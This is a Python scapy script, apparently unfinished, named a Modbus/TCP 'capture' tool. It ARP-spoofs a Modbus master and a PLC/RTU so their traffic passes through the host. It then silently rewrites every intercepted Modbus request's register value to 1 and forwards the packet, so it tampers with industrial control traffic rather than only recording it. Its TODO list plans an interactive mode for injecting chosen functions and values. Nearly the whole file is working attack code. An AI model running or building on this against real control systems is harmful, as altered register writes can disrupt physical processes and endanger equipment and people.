#!/usr/bin/env python3
"""
modbus_mitm_capture.py

Modbus/TCP MITM capture tool using ARP spoofing to reposition traffic
between a Modbus master and slave onto this host, then decoding the
Modbus/TCP traffic that flows through.

Requires: scapy, root privileges, and IPv4 forwarding support
  pip install scapy --break-system-packages

Usage:
  sudo python3 modbus_mitm_capture.py -i eth0 --victim 192.168.1.50 --target 192.168.1.10

  
Features to add:
    - interactive mode: open prompt when the first modbus packet hits us, and allow user to select exactly what function and value they want to send
    - more output/logging to help debug + improve user experience
    - a nice banner, ofc
    - rename 'victim' and 'target' to 'client' and 'server'
    - add short flags
    - complete other TODOs
  """

import argparse
import struct
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

try:
    from scapy.all import (
        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,sr
    )
    from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
except ImportError:
    print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
    sys.exit(1)

def log_line(msg, log_file=None):
    line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
    print(line)
    if log_file:
        log_file.write(line + "\n")
        log_file.flush()

def get_mac(ip, iface, timeout=3):
    ans = sr1(ARP(op=1, pdst=ip), timeout=timeout,  verbose=0)
    return ans[ARP].hwsrc if ans else None


def arp_spoof_loop(iface, victim_ip, victim_mac, target_ip, target_mac, own_mac, stop_event, interval=2):
    while not stop_event.is_set():
        # Tell victim that we are the target
        pkt1 = Ether(dst=victim_mac, src=own_mac) / ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=own_mac
        )
        # Tell target that we are the victim
        pkt2 = Ether(dst=target_mac, src=own_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=own_mac
        )
        sendp(pkt1, iface=iface, verbose=0)
        sendp(pkt2, iface=iface, verbose=0)
        stop_event.wait(interval)


def restore_arp(iface, victim_ip, victim_mac, target_ip, target_mac):
    # Send correct mappings a few times to overwrite the poisoned entries
    for _ in range(5):
        pkt1 = Ether(dst=victim_mac, src=target_mac) / ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac
        )
        pkt2 = Ether(dst=target_mac, src=victim_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac
        )
        sendp(pkt1, iface=iface, verbose=0)
        sendp(pkt2, iface=iface, verbose=0)
        time.sleep(0.3)


def handle_packet(pkt, port, log_file,mappings,own_mac):
    src = own_mac
    dst = pkt[IP].dst 

    print("Source: "+src)
    print("Dest: "+str(mappings[dst]))

    npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
    npkt[Ether].src=src
    npkt[Ether].dst=mappings[dst]
    # print(npkt.show(dump=True))

    # if not (npkt.haslayer(TCP) and npkt.haslayer(IP)):
    #     sendp(npkt,loop=0,inter=0.2)
    #     return

    if npkt.haslayer(ModbusADURequest):
        mb = npkt[ModbusADURequest]
    # elif npkt.haslayer(ModbusADUResponse):
    #     mb = npkt[ModbusADUResponse]
    else:
        sendp(npkt,loop=0,inter=0.2)
        return

    tcp = npkt[TCP]
   
    if tcp.sport != port and tcp.dport != port:
        return
    direction = "req " if tcp.dport == port else "resp"
    src = f"{npkt[IP].src}:{tcp.sport}"
    dst = f"{npkt[IP].dst}:{tcp.dport}"
    log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)

    
    if npkt.haslayer(ModbusADURequest):
        npkt[ModbusADURequest].registerValue=1
        print(f"Register Value: ",npkt[ModbusADURequest].registerValue)
        # npkt[ModbusADURequest].transId=4660
    # elif npkt.haslayer(ModbusADUResponse):
    #     npkt[ModbusADUResponse].registerValue=1
    #     print(f"Register Value: ",npkt[ModbusADUResponse].registerValue)
    #     npkt[ModbusADUResponse].transId=4660

    # del p.chksum
    del npkt[TCP].chksum
    del npkt[IP].chksum

    # print(npkt.show(dump=True))
    sendp(npkt,loop=0,inter=0.2)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-i", "--interface", required=True, help="Interface to use")
    ap.add_argument("-v","--victim", required=True, help="IP of the Modbus master (client)")
    ap.add_argument("-t","--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
    ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
    ap.add_argument("--log", help="Optional path to append decoded output to")
    ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
    args = ap.parse_args()

    print("This tool actively repositions traffic via ARP spoofing.")
    print(f"Target scope: victim={args.victim}  target={args.target}  iface={args.interface}")

    log_file = open(args.log, "a") if args.log else None
    stop_event = threading.Event()

    try:
        conf.iface = args.interface
    except Exception as e:
        log_line("[-] Error: "+str(e),log_file)
        exit(1)

    own_mac = get_if_hwaddr(args.interface) # interface mac address
    victim_mac = get_mac(args.victim, args.interface)
    target_mac = get_mac(args.target, args.interface)

    if not victim_mac or not target_mac:
        print("Could not resolve MAC address for victim or target — aborting.", file=sys.stderr)
        sys.exit(1)

    log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
    log_line(f"Resolved target {args.target} -> {target_mac}", log_file)

    spoof_thread = threading.Thread(
        target=arp_spoof_loop,
        args=(args.interface, args.victim, victim_mac, args.target, target_mac, own_mac, stop_event, args.arp_interval),
        daemon=True,
    )
    spoof_thread.start()
    log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)

    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" # TODO: make MAC address whitelist automatic

    # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"

    mappings = {args.victim:victim_mac,args.target:target_mac}
    
    try:
        sniff(iface=args.interface, filter=bpf_filter,
              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac), store=False)
        # sniff(iface=args.interface,
        #       prn=lambda p: handle_packet(p, args.port, log_file), store=False)
    except KeyboardInterrupt:
        pass
    finally:
        log_line("Stopping — restoring ARP tables and disabling forwarding.", log_file)
        stop_event.set()
        spoof_thread.join(timeout=2)
        restore_arp(args.interface, args.victim, victim_mac, args.target, target_mac)
        # set_ip_forwarding(False)
        if log_file:
            log_file.close()


if __name__ == "__main__":
    main()